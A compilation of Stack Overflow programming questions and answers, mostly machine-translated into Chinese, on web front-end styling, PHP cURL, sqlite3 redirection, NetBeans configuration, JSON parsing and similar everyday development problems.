```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-08-19T19:15:25.463

您想要对输入执行的操作 - 将其添加到您的样式中：

```
input::-webkit-input-placeholder {
color: red !important;
}

input:-moz-placeholder { /* Firefox 18- */
color: red !important;  
}

input::-moz-placeholder {  /* Firefox 19+ */
color: red !important;  
}

input:-ms-input-placeholder {  
color: red !important;  
} 
```

如果将其应用于有限的输入组，您可以像这样指定它：

```
.custom-style-name input::-webkit-input-placeholder {
color: red !important;
}

.custom-style-name input:-moz-placeholder { /* Firefox 18- */
color: red !important;  
}

.custom-style-name input::-moz-placeholder {  /* Firefox 19+ */
color: red !important;  
}

.custom-style-name input:-ms-input-placeholder {  
color: red !important;  
} 
```

这个对我有用。希望它也适合你。干杯!

# iframe - TinyMCE 导致在 SSL 上出现不安全项目警告

> ID：14903209
> 
> 赞同：1
> 
> 时间：2013-02-15T20:57:06.503
> 
> 标签：iframe, ssl, tinymce

我正在使用 TinyMCE，并且有一个使用 http:// 图像的电子邮件模板。该页面是 SSL，但由于外部站点上保存的图像的 http://，我不断收到该页面的不安全项目。我将其更改为 https:// 并且不安全的警告消失了。有没有解决的办法？

# php - How do I remove all headers from a CURL Post

> ID：14903211
> 
> 赞同：0
> 
> 时间：2013-02-15T20:57:07.493
> 
> 标签：php, curl, http-post, libcurl

I am trying to post xml to a server using cURL without any headers but I can't seem to get rid of the following headers:

```
Content-Disposition: form-data; name="data"; filename="tempData.xml". 
```

Does anyone know how to remove these headers and just send the file?

Code is below:

```
$URL = www.myurl.com/process/php;

        //get post data
        $post = array("data"=>"@tempData.xml"); 

        //add headers
        /*$Headers = array
            ( "POST HTTP/1.0"
            , "Accept: text/xml"
            , "Content-type: text/xml"
            );*/

        //$Headers = array("");

        //create curl instance and set options
        $CH = curl_init($URL);
        curl_setopt( $CH, CURLOPT_TIMEOUT, 60 ); //timeout after 60 seconds
        curl_setopt( $CH, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt( $CH, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt( $CH, CURLOPT_HTTPHEADER, 0);
        curl_setopt( $CH, CURLOPT_HEADER, 0);
        curl_setopt( $CH, CURLOPT_POST, true );
        curl_setopt( $CH, CURLOPT_POSTFIELDS, $post ); // add post fields

        //echo curl_error($CH);
        $output = curl_exec( $CH );
        $info = curl_getinfo( $CH );
        //print_r($info);

        if($info['http_code'] != 200){
            //header('HTTP/1.0 500 Could Not Send XML');
            echo 'error ' . $info["http_code"];
            curl_close($CH);
            exit(1);
        }

        curl_close($CH) 
```

;

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T21:08:53.370

It isn't really possible if done like this.

When you select to do a multipart formpost with libcurl, it will actually do a formpost according to the spec. It was originally specified in [RFC1867](http://www.ietf.org/rfc/rfc1867.txt), and it did already then specify that the Content-Disposition: should be there for each form part.

If you want to do your own non-compliant post, then craft your own buffer completely instead of relying on libcurl's multipart formpost support.

Let me end up with saying that your commented out code that specifies custom headers is wrong since it includes a request line among the headers.

# javascript - 使用 Express 和 EmailJS 发送电子邮件

> ID：14903218
> 
> 赞同：1
> 
> 时间：2013-02-15T20:57:52.927
> 
> 标签：javascript, node.js, express

我尝试使用 Express 的 EmailJS 模块发送电子邮件，但它只能在本地工作，它不能在远程（AppFog）中工作......我不明白这个问题......

```
var email   = require("emailjs");

var server = email.server.connect({
    user: "******",
    password: "******",
    host: "smtp.gmail.com",
    ssl: true
});

var send = function(message, from, subject) {
    server.send({
        text:    message,
        from:    from,
        to:      "******** <*********>",
        subject: subject
    });
}

exports.index = function(req, res) {
    res.render('contact', {
        emailSuccess: false,
        title: "my title"
    });
}

exports.send = function(req, res) {
    send(req.body.message, req.body.from, req.body.subject);
    res.render('contact', {
        emailSuccess: true,
        title: "my title"
    });
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T23:54:03.997

AppFog 阻止 SMTP 传出请求以防止垃圾邮件。

您需要使用 Sendgrid、Amazon SES、Postmark 等服务...

# command-line - 以艰难的方式学习 SQL - 在 SQL Lite 3 中使用 .db 创建 .sql - 为什么以及如何？

> ID：14903220
> 
> 赞同：6
> 
> 时间：2013-02-15T20:57:54.157
> 
> 标签：command-line, sqlite

作为一个拥有超过 20 小时 Python 编码和熟悉命令行的新手的初级程序员，我打开了 Zed Shaw 的“Learn SQL The Hard Way”，很快就被难住了。

在[练习 01](http://sql.learncodethehardway.org/book/ex1.html)中，Zed 让您使用以下第一个命令创建您的第一个表：

```
sqlite3 ex1.db < ex1.sql 
```

但是，这无法在我的命令行中运行，并给出错误消息“-bash: ex1.sql: No such file or directory”。最初，我忽略了这个推荐的代码并继续：

```
sqlite3 ex1.db
SQLite version 3.7.15.1 2012-12-19 20:39:10
Enter ".help" for instructions
Enter SQL statements terminated with a ";"
sqlite> CREATE TABLE person (
   ...>     id INTEGER PRIMARY KEY,
   ...>     first_name TEXT,
   ...>     last_name TEXT,
   ...>     age INTEGER
   ...> ); 
```

在命令行中运行“ls -l”显示：

```
-rw-r--r--  1 thefifth  staff  2048 Feb 15 15:23 ex1.db 
```

但我想要但没有得到的是：

```
$ ls -l
-rw-r--r--  1 zedshaw  staff  2048 Nov  8 16:18 ex1.db
-rw-r--r--  1 zedshaw  staff    92 Nov  8 16:14 ex1.sql 
```

我搜索了一下，发现[这个博客](http://www.adamjonas.com/blog/learn-sql-the-hard-way/)实现了相同的“name.db < name.sql”语法，但是按照这里的代码对我也不起作用。这个[Stack Overflow](https://stackoverflow.com/questions/2049109/how-to-import-sql-into-sqlite3)也有类似的语法，但在将 .sql 转换为 sqlite3 的上下文中。

具体来说，我想知道这是否是在本机 bash 终端中使用的“<”，并且我未能满足其正确使用的某些标准。此外，我不知道同时创建 .sql 和 .db 文件的目的，尽管显然其中一个比另一个小得多。也许我错误地安装了 sqlite3，但它似乎工作正常。

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-15T21:04:52.837

```
sqlite3 ex1.db < ex1.sql 
```

对于上述工作，`ex1.sql`应该已经存在。`<`是在 shell 中用于输入重定向的字符。`sqlite3`从这里开始使用一个新的或现有的数据库（它将根据需要创建数据库），并从中获取 SQL 语句`ex1.sql`，执行它们并`ex1.db`进行相应的修改。

现在让我们`ex1.sql`从生成`ex1.db`，您显然想要这样做：

```
sqlite3 ex1.db .dump > ex1.sql 
```

我们再次使用 shell 重定向工具，现在将*输出*重定向到`ex1.sql`. 该`.dump`命令`sqlite`写出 SQL 语句，这些语句在空数据库中执行时将重新创建类似的数据库：重新创建表并使用 填充`INSERT`等。

现在您可以转到第 1 步：

```
sqlite3 ex1copy.db < ex1.sql 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-28T06:45:55.290

1.  将代码保存在扩展名为 .sql 的文件中
2.  然后在终端： sqlite3 ex1.db < ex1.sql 用于创建 ex1.db
3.  放入终端： sqlite3 ex1.db .schema
4.  或者说： sqlite3 ex1.db [... 然后....] .schema

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-04-03T14:58:39.783

我今天遇到了同样的问题，和你一样，我想知道为什么我的命令不起作用。如上所述，作者假设您在文本编辑器中创建初始命令并保存为 .sql 文件。然后 ex1.db < ex1.sql 命令将文件转换为 .db 文件。

# javascript - 为什么在使用长轮询时设置客户端超时？

> ID：14903223
> 
> 赞同：5
> 
> 时间：2013-02-15T20:58:05.127
> 
> 标签：javascript, comet, long-polling, instant-messaging, instant

在我看到的几乎每个长轮询示例中，客户端都有 30 秒的超时。这样做的确切原因是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-15T21:00:43.667

一些路由器、代理或中间的任何设备可能会决定丢弃长时间处于空闲状态的 TCP/IP 连接。偶尔刷新连接可以确保您更快地发现服务器故障。

# maven - 是否可以为特定的 mojo 或目标打开调试日志记录？

> ID：14903224
> 
> 赞同：2
> 
> 时间：2013-02-15T20:58:08.243
> 
> 标签：maven

我正在尝试在构建期间调试特定的 Maven 目标执行。我知道我可以使用 -X 来获取所有调试日志，但这会产生大量对我无用的信息。

有没有办法将 -X 定位到特定的插件/目标/执行？

# php - 如何在 NetBeans 中添加带有点 (blade.php) 的自定义文件扩展名？

> ID：14903225
> 
> 赞同：15
> 
> 时间：2013-02-15T20:58:11.467
> 
> 标签：php, netbeans, laravel, blade

我需要分配一个自定义扩展名，以便在 netbeans 中识别为 twig 文件（'blade.php' 为 'twig' 文件，并适当地给我语法突出显示和代码完成）。使用文件关联选项 (in `Tools > Options > Miscellaneous > Files`) 的问题是它不允许我添加 '.' 在像 Blade.php 这样的扩展中，它适用于单字扩展，如 php、html、css 等。

如果有人可以帮助我，将不胜感激！

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2015-04-12T14:05:54.163

解决方法我想出了并且似乎有效（至少 Netbeans 8.x+）

*   去`Tools > Options > Miscellaneous > Files`
*   点击`New`
*   输入*刀片*作为新的扩展（你可以在这里使用任何东西，但这似乎是最自然的）
*   点击`OK`
*   在`Associate File Type (MIME)`选择*TWIG (text/x-twig)*
*   点击`OK`整个`Options`窗口
*   关闭 Netbeans
*   打开 Netbeans 配置文件夹 - 在 Windows 上是`%AppData%\Netbeans\<version>\`
*   转到子文件夹`config\Services\MIMEResolver`
*   打开`user-defined-mime-resolver.xml`
*   找到`<ext name="blade"/>`条目（或您在上面输入的任何内容）
*   *将刀片*更改为*blade.php*
*   保存并关闭文件

瞧，高亮现在应该在 Netbeans IDE 中工作了 :)

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2018-05-10T05:39:16.277

修改`user-defined-mime-resolver.xml`文件，使其看起来*像*这样：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE MIME-resolver PUBLIC "-//NetBeans//DTD MIME Resolver 1.1//EN" "http://www.netbeans.org/dtds/mime-resolver-1_1.dtd">
<MIME-resolver>
    <file>
        <ext name="php"/>
        <name name=".blade" substring="true"/>
        <resolver mime="text/x-twig"/>
    </file>
    <file>
    <ext name="php"/>
        <resolver mime="text/x-php5"/>
    </file>
</MIME-resolver> 
```

在 Linux (Ubuntu) 上，您可以在以下位置找到此文件：
`$HOME/.netbeans/8.2/config/Services/MIMEResolver/user-defined-mime-resolver.xml`

在 Windows 上，您可以在以下位置找到该文件： `%AppData%\Netbeans\8.2\config\Services\MIMEResolver\user-defined-mime-resolver.xml`

基本上，第一个`<file>`块扫描任何 PHP 文件的文件名，以查看它是否包含“.blade”子字符串。如果是这样，该文件将被视为 Twig 文件。如果不是，第二个`<file>`块会将文件视为普通的 PHP 文件。

您可能需要“Twig Templates”NetBeans 插件才能正确突出显示：
`Tools > Plugins > Available Plugins > Twig Templates`

它并不完美......刀片指令等`@include`仍然以纯文本突出显示。但是，我觉得它是对 PHP 语法高亮的显着改进。

以下来源非常有帮助：

*   [如何：声明性 MIME 类型解析器](http://bits.netbeans.org/7.4/javadoc/org-openide-filesystems/org/openide/filesystems/doc-files/HOWTO-MIME.html)
*   [DTD 语法文档](http://bits.netbeans.org/7.4/javadoc/org-openide-filesystems/org/openide/filesystems/doc-files/resolverDocumentation.html)
*   [David Benedeki 之前对这个问题的回答](https://stackoverflow.com/a/29590298/5338557)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2016-03-18T19:55:48.530

很多人都在其他系统上开发，就像我在 Centos 7 上一样，所以这个解决方法几乎奏效了。

对于 CentOS，可能还有其他系统，请按照以下步骤操作，与上面的 Windows 几乎相同：

*   打开 Netbeans。转到`Tools->Options->Miscellaneous`并选择选项卡`Files`。
*   `File Extension`在行中，单击按钮`New`。输入`crazywrongname`作为扩展名（这对选项 2 很重要）
*   在此之下，`Associated File Type (MIME):`选择选项`TWIG (text/x-twig)`
*   单击`Apply`，然后`OK`。
*   关闭 Netbeans

**选项1：**

以下步骤适用于**CentOS 7**和**NetBeans 8.1**，很可能也适用于其他系统，但如果您在该路径中找不到文件，选项 2 如下。

*   打开终端并`/root/.netbeans/8.1/config/Services/MIMEResolver/user-defined-mime-resolver.xml`在您喜欢的文本编辑器中打开文件，例如运行命令`nano /root/.netbeans/8.1/config/Services/MIMEResolver/user-defined-mime-resolver.xml`
*   在此文件中找到参数名称“crazywrongname”，并将其更改为“blade.php”
*   保存文件
*   打开 Netbeans 并享受。

未来的人们，您可能会尝试将文件路径中的 Netbeans 版本从选项 1 更改为您的版本，例如 14.3 或 2028 年推出的任何版本。

**选项 2：**

如果您无法在上面的确切路径中找到此文件，请运行以下命令来查找它：

```
cd / && grep -rI --exclude-dir=proc --exclude-dir=sys crazywrongname * 
```

这将从根目录开始在整个系统上搜索特定模式。这就是我们为参数命名的原因`crazywrongname`——因此在系统上的任何其他文件中都找不到它，就像`blade`那样。它还将排除不应访问的文件夹。如果您不排除它们，您将收到错误并可能会挂起您的系统。此外，一些粉红色的独角兽可能会死亡。

找到系统的确切文件路径后，请按照选项 1 中的其余步骤更改参数名称。

谢谢你，神秘的 David Benedeki，他在回答后从 StackOverflow 消失了，这对你有很大帮助:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-11T01:11:30.127

正如我所看到的，问题更多的是以*NetBeans 为中心*，因此我还建议您向 NetBeans 社区提交错误报告。

*   [NetBeans 论坛](http://forums.netbeans.org/)。
*   [NetBeans 错误跟踪器](https://netbeans.org/community/issues.html)。

也许将来他们可以解决这个问题。您也可以链接该问题，以便他们可以看到用户的反应。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-04-28T05:20:13.727

用于使用自定义 *BladeDataObject 文件进行模块开发

```
@MIMEResolver.Registration(
        resource = "BladeResolver.xml",
        displayName = "#LBL_Blade_LOADER" 
) 
```

并在同一个包中创建带有内容的 BladeResolver.xml 文件

```
<MIME-resolver>
    <file>
        <ext name="php"/>
        <name name="blade" substring="true">
            <resolver mime="text/x-blade"/>
        </name>
    </file>
</MIME-resolver> 
```

# android - Android 中的 JSON 数组或对象错误

> ID：14903226
> 
> 赞同：0
> 
> 时间：2013-02-15T20:58:23.520
> 
> 标签：android, json

我有一个从名为 data 的 HttpClient 返回的字符串。

```
Data = {"result":[{"id":"2","contextID":"1","name":"Kitchen","image":"81"},
{"id":"1","contextID":"1","name":"Living Room","image":"18"},
{"id":"3","contextID":"1","name":"Toilet","image":"75"}]} 
```

然后我正在执行此代码：

```
resultArray = new JSONArray (data); 
```

并返回这个 JSONArray。但是，我收到 JSONException 错误：

```
JSONObject cannot be converted to JSONArray 
```

这肯定是 JSONArray 而不是 JSONObject？或者它是 JSONObjects 的 JSONObject？我对 JSON 很陌生，我想循环使用这些导入的值创建新的位置。有没有一种简单或成熟的方法来做到这一点？

非常感谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:00:29.600

`Data`是一个 JSONObject，并且`Data["result"]`是一个包含 JSONObjects 的 JSONArray。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:00:31.293

它是一个 json 对象，其中包含 JSONObjects 的 JSONArray。{ } 表示对象，[] 表示数组。因此，您将顶级字符串作为 JSON 对象获取，然后将结果参数作为数组获取，然后将结果中的每个索引作为对象获取（您可以通过 getString 等获取这些参数的参数）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:14:21.380

Data is actually a `JSONObject` that contains a `JSONArray` named "result." If you wanted to get the `JSONArray` you'd have to do the following:

```
JSONObject dataObj = new JSONObject(data);
JSONArray dataArr = dataObj.getJSONArray("result"); 
```

For future reference, since you're new to JSON, data inside {} braces is a JSONObject and data inside [] braces is a JSONArray. Arrays and objects can be nested inside of each other and it's sometimes hard to read. I recommend formatting your data if you need help reading it. I personally use [http://jsonformatter.curiousconcept.com/](http://jsonformatter.curiousconcept.com/) to format and validate my data. I'm not associated with the site in any way. I just find it really useful.

# ruby-on-rails - it-block 不再接受额外的 javascript 参数

> ID：14903228
> 
> 赞同：0
> 
> 时间：2013-02-15T20:58:27.750
> 
> 标签：ruby-on-rails, capybara, minitest, specifications

我对 minitest 和 capybara 有一个奇怪的问题。

我正在使用 rails 3.2.8 并使用 minitest/capybara/poltergeist 进行测试。到现在为止，一切都很顺利。我总是可以测试我的javascript东西。

对于一个新项目，我下载了 rails 4 来稍微了解一下。而且由于 minitest 将成为测试框架，我认为这很容易。不是。说实话，在设置​​所有东西时，我不是英雄。我只是跟随瑞恩贝茨。在大量添加、删除和更新大量 gem 之后，我认为继续使用 Rails 4 是不值得的。我在集成测试中遇到了很多问题。我知道的所有东西都没有按预期工作。在我想测试一个 javascript 的东西之前，几乎一切都正常工作时，斧头掉了下来。我收到了这个错误：

.rbenv/versions/1.9.3-p194/lib/ruby/gems/1.9.1/gems/minitest-4.6.1/lib/minitest/spec.rb:190:in `it'：参数数量错误（2对于 1) (参数错误)

因为这

```
describe "blabla" do
  it "does not do what i want it to do", js: true do
    pending
  end
end 
```

它不会接受 js: true 参数。有趣的是 describe 块将接受 js: true 参数。

当我回到 Rails 3.2.8 时，因为我认为这是 Rails 4 的东西，这个宝贝跟着我进入了一个新的测试套件。我努力在谷歌上找到答案，但我找不到任何答案。我的其他 rails 3.2.8 项目仍然测试良好，没有抱怨 javascript 参数。但是对于新应用程序：没有 javascript 测试。

我在这里不知所措。我不知道这是从哪里来的。由于我的其他 3.2.8 应用程序仍然可以正常工作，这可能与更新的 gem 版本有关？有没有人看到这个错误信息？我从错误消息中检查了抱怨的 minitest/spec.rb 文件，第 190 行有几个 minitest 版本，it 方法没有任何变化。

如果您对可能出现的问题有任何线索，请告诉我您是否想查看内容（Gemfile？test_helper.rb？）。提前致谢！

卡斯帕

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T17:48:39.393

Minitest 的规范 DSL 不接受 it 块的第二个参数。minitest [-metadata](https://github.com/wojtekmach/minitest-metadata) gem 添加了对第二个参数的支持，该示例显示了如何配置 Capybara 以使用它。也许您现有的项目使用 minitest-metadata 并使用它配置 Capybara，而您的新项目没有？

# html - CSS 元素类 - 高度因内容而异，如何解决？

> ID：14903230
> 
> 赞同：0
> 
> 时间：2013-02-15T20:58:29.720
> 
> 标签：html, css, frontend

我有一个css问题。检查我的网站[http://yourdesigns.nl/ssi/index.php](http://yourdesigns.nl/ssi/index.php)

如您所见，我在索引页面的中心有一个 3 列行。每列都有一个边框，给人一种“盒子状”的感觉。问题是，一旦一个盒子的内容比另一个盒子小，盒子的高度就会变小。

我的目标是给所有盒子相同的高度，我知道这可以通过简单地将 height 属性添加到我的盒子元素的类中，但是所有内容都是从数据库中获取的，所以如果我的客户更新内容，它可能框可能大于类的固定高度值，这导致内容与边框/框重叠。

我怎样才能让我的所有盒子都具有相同的高度，而不在我的 CSS 中给出固定的高度值？

提前致谢，

迈克尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:25:01.120

If you want to keep the box heights equal and prevent overflow you could set the height and overflow properties in CSS for your box class:

```
.boxes
{
   height:500px;
   overflow: hidden;
   text-overflow:ellipsis; // ends the text block with "..." - css3 no ie7/ie8 support
} 
```

If you want the boxes to re-size dynamically based on the largest box you could use jQuery:

```
$(document).ready(function () {      
   var largestBox = Math.max($('#box1').height(),$('#box2').height(),$('#box3').height());
   $('.boxes').height(largestBox );
}); 
```

Here's a jsfiddle demonstrating the jQuery option: [http://jsfiddle.net/EjPSw/](http://jsfiddle.net/EjPSw/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:26:18.593

You could try using jQuery.

Give each box an id, for example box1, box2, box3;

U could use jQuery like this:

```
$(function(){
var box1 = $("#box1").height();
var box2 = $("#box2").height();
var box3 = $("#box3").height();

if((box1 > box2) && (box1 > box3))
{
   box2.height(box1);
   box3.height(box1);
} 
else if((box2 > box1) && (box2 > box3))
{
   box1.height(box2);
   box3.height(box2);
}
if((box3 > box2) && (box3 > box1))
{
   box2.height(box3);
   box1.height(box3);
}
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-15T21:09:13.220

你必须将你的盒子放在一个 div 容器中。外容器应该有样式

```
{
    overflow: hidden;
    border-bottom:1px solid gray;
} 
```

而容器内的盒子应该有风格

```
{
    border:1px solid gray;
    float:left;
    text-align:center;
    padding-bottom: 200em;
    margin-bottom: -200em;
} 
```

按照[示例](http://jsfiddle.net/eyecode/qBLpJ/1/)的链接：

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:08:16.127

我不知道非 css3 解决方案，我会通过计算所有框来选择 jQuery 解决方案，而不是为所有框指定最高高度。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-15T20:59:59.497

尝试类似的东西

```
 min-height: 500px 
```

# python - 在 Python 中将带有嵌入式 CSS 的 SVG 转换为 PDF

> ID：14903233
> 
> 赞同：12
> 
> 时间：2013-02-15T20:58:39.760
> 
> 标签：python, svg, pdf-generation

我正在尝试使用 Python 从 SVG 图像生成 PDF 图像。我已经尝试过[CairoSVG](http://cairosvg.org)和[svglib](http://pypi.python.org/pypi/svglib/)。问题是在这两种情况下生成的 PDF 都没有应用任何嵌入的 CSS 样式。

这是一个简单的 SVG 文件，它应该呈现一个带有黑色边框的蓝色矩形：

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200" height="200" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <style type="text/css"><![CDATA[
      rect {
        fill: #1f77b4;
        stroke: black;
        stroke-width: 1;
        shape-rendering: crispEdges;
      }
    ]]></style>
  </defs>
  <rect x="50" y="50" width="100" height="100"></rect>
</svg> 
```

使用 CairoSVG 呈现此 SVG 的 PDF 时，PDF 图像呈现为黑色矩形。使用 svglib，矩形没有应用任何描边或样式，因此它是不可见的。有没有人知道将**带有 CSS 样式**的 SVG 转换为Python 中的 PDF 图像的方法？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-07-28T20:41:03.243

（在@MonkeyWrench 的帮助下，因为他没有发布答案。）

根据[文件](http://cairosvg.org/user_documentation/)，

> CairoSVG 可以使用 lxml 来解析 SVG 文件，并且可以使用 tinycss 加 cssselect 来应用标签样式属性中不包含的 CSS。如果这些包不可用，CSS 将仅在样式属性中受支持。

首先，我安装了所有依赖项，

```
$ pip3 install cairosvg lxml tinycss cssselect 
```

然后我创建`image.svg`了以下内容：

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="200" height="200" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <style type="text/css"><![CDATA[
      rect {
        fill: #1f77b4;
        stroke: black;
        stroke-width: 1;
        shape-rendering: crispEdges;
      }
    ]]></style>
  </defs>
  <rect x="50" y="50" width="100" height="100"></rect>
</svg> 
```

最后，我执行了 cairosvg

```
$ cairosvg image.svg -o image.pdf 
```

果然，它是一个蓝色的矩形。

![蓝色的](../Images/081e1409682eb176753cfdf9750e3b01.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-15T21:14:34.990

您是否尝试过使用 style 属性？

```
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <rect x="50" y="20" width="100" height="100"
  style="fill:#1f77b4;stroke:black;stroke-width:1;shape-rendering: crispEdges;"
  stroke-opacity:0.9"/>
</svg> 
```

它最终与您已经拥有的相同，但可能 CairoSVG 会跳过 HTML 中的样式元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-07-23T20:02:58.427

我建议使用[PhantomJS](http://phantomjs.org/)。

基本上它是一个无头 WebKit，由 Javascript 驱动。

查看[rasterize.js](https://github.com/ariya/phantomjs/wiki/Screen-Capture)脚本。

您可以获取坐标并将该部分导出（栅格化）为图像。然后，您可以通过嵌入图像来使用基本上任何 PDF 生成器。或者，您可以使用另一个脚本通过 PhantomJS 生成 PDF 文件。

# pdf - 解析 pdf 内容流以了解段落边界

> ID：14903240
> 
> 赞同：1
> 
> 时间：2013-02-15T20:59:21.130
> 
> 标签：pdf, pdfbox, xpdf

有没有办法解析 pdf 内容流并识别段落边界？我阅读了 ISO 32000-1:2008，但无法理解 pdf 内容流是否包含任何告诉显示软件开始段落或结束段落的运算符。任何文本提取器软件都可以喜欢`pdfbox`或`xpdf`提供该信息吗？

# ruby-on-rails-3 - 在 link_to 中使用变量：确认

> ID：14903242
> 
> 赞同：2
> 
> 时间：2013-02-15T20:59:41.587
> 
> 标签：ruby-on-rails-3, link-to, confirm

我想在`confirm`消息中使用变量`link_to`

```
<%= link_to 'DESTROY!', @user, :confirm => "are you sure you want to delete #{@user.name}"%> 
```

这似乎不起作用，它打印`"are you sure you want to delete #{@user.name}"`

如何在确认消息中使用变量？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-15T21:59:37.657

它只是一个红宝石字符串，确认与它无关，你确定你的实际代码中有双引号吗？它不是插值，当你有单引号时会发生这种情况。

# javascript - 结合 javascript 原型样式

> ID：14903243
> 
> 赞同：1
> 
> 时间：2013-02-15T20:59:43.270
> 
> 标签：javascript, prototype-chain

是否可以结合以下

```
function something() {}
function somethingElse() {}

somethingElse.prototype = new something();
somethingElse.prototype.someFunction = function() {}
... 
```

有了这个

```
somethingElse.prototype = {
    someFunction: function() {},
    ...
} 
```

并维护原型继承链

我猜这纯粹是化妆品。我只想在 {} 中定义所有函数，而不是使用大量 ...prototype... = ...

我见过很多，但从来没有把它们放在一起。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-15T21:03:06.457

我个人最喜欢的方法是获取 underscore.js 库。它有一个非常好的方法，称为扩展，可以将属性附加到对象上。所以，我可以这样做：

```
function something() {}
function somethingElse() {}

somethingElse.prototype = new something();

_.extend(somethingElse.prototype, {
    someFunction: function () { },
    someOtherFunction: function () { }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-15T21:19:49.203

您可以使用`Object.defineProperties`，但它实际上更冗长，并且在旧版浏览器中不支持：

```
Object.defineProperties(somethingElse.prototype,{
    someOtherFunction: {
        value:function() {...}
    },
    ...
}); 
```

或者，您可以`extend`向 Object 原型添加一个基本方法：

```
Object.prototype.extend = function(obj){
    for(var p in obj)this[p] = obj[p];
}; 
```

这将允许您这样做：

```
somethingElse.prototype.extend({
    A:function(){'a'},
    B:function(){'b'}
}); 
```

我通常会建议不要这样做，因为修改本机对象的原型可能会很冒险。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-15T21:02:04.070

不同的是，在第二个版本中，`somethingElse`实例不会`something`从其原型链继承任何东西。不过，考虑到您的示例代码，这不会有任何区别。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-15T21:03:00.450

嗯，它们确实是一样的。

```
foo = {}
foo.bar = baz 
```

是相同的

```
foo = {
    bar: baz
} 
```

这是一个品味问题。

顺便说一句：用大写首字母命名构造函数（任何用 new 调用的东西）被认为是更好的风格，以将其与常规函数区分开来，因为混淆它们可能会做非常糟糕的事情。

# javascript - javascript 日历 - 突出显示特定日期

> ID：14903257
> 
> 赞同：0
> 
> 时间：2013-02-15T21:00:46.503
> 
> 标签：javascript, jquery-ui-datepicker

我有一个 datepicker javascript 日历，它用特定的颜色突出显示特定的假期。
我需要它来突出显示星期三 (3) - 星期六 (6) 的日子并且我正在苦苦挣扎。
这是我到目前为止使用的代码：

```
<script type="text/javascript">
        $(document).ready(function() {
                var SelectedDates = {};

                SelectedDates[new Date('01/01/2014')] = new Date('01/01/2014');
                SelectedDates[new Date('01/02/2014')] = new Date('01/02/2014');
                SelectedDates[new Date('01/03/2014')] = new Date('01/03/2014');

                $('#date1, #date2').datepicker({
                        beforeShowDay: function(date) {
                                var Highlight = SelectedDates[date];
                                if (Highlight) {
                                        return [true, "highlighted", Highlight];
                                }
                                else {
                                        return [true, '', ''];
                                }
                        }
                });

        });

    </script> 
```

CSS 看起来像这样：

```
.highlighted a{background:#f57d31 !important;} 
```

表格如下所示：

```
<input id="date1" name="date1" size="12" type="text" /> 
```

请帮助在整个日历上突出显示星期三 (3) - 星期六 (6) 的最佳路线。谢谢~！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-19T15:21:23.873

以下重点介绍了 5 月至 9 月的周三至周六：

```
$('#date1, #date2').datepicker({
    beforeShowDay: function (date) {
        var day = date.getDay();
        var month = date.getMonth();
        return [(day>=3 && day<=6)&&(month>=4 && month<=8), "highlighted"];
    }
}); 
```

**[jsFiddle 示例](http://jsfiddle.net/j08691/s6X97/4/)**

# android - 我的 Android APP 和插入我的 PC 的一个蓝牙适配器之间的连接

> ID：14903260
> 
> 赞同：0
> 
> 时间：2013-02-15T21:01:23.383
> 
> 标签：android, bluetooth, dongle

我正在尝试建立该连接，但我总是收到此错误：“连接被拒绝”。设备正在配对，但之后我收到了这个异常。

我正在尝试使用正确的地址进行连接，并且正在尝试以这种方式创建套接字连接：

> 方法 m = device.getClass().getMethod("createRfcommSocket", new Class[] {int.class} ); tmp = (BluetoothSocket) m.invoke(device, 1);

我尝试使用一个 UUID，但总是收到“服务发现失败”

如果你需要我放更多代码或者我解释得更好，你可以说。我会很感激任何帮助，我已经尝试了我在互联网上找到的所有东西，但没有任何效果=（

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-15T22:11:27.813

从错误来看，您尝试连接的设备上似乎没有服务器，或者服务器没有运行/监听。PC 上正在运行什么应用程序？您是否在 PC 上设置了蓝牙串行端口并让一些应用程序打开它并等待一些数据进入。

# wpf - WPF ComboBox 未在选择时触发

> ID：14903261
> 
> 赞同：0
> 
> 时间：2013-02-15T21:01:24.857
> 
> 标签：wpf, mvvm, binding

